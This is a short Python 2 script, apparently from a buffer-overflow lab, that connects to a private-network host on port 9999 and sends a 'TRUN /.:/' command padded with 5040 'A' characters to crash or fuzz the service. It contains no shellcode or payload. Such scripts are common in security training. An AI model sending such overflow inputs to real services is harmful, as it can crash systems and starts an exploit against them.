#!/usr/bin/python

import socket
import os
import sys
from pwn import *
host = "192.168.1.3"
port = 9999

buffer = "A"*5040
print "Fuzzing start"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))  
print "[+] Sending exploit..."
s.send("TRUN /.:/ " + buffer)
print len(buffer)
#print s.recv(1024)
s.close()
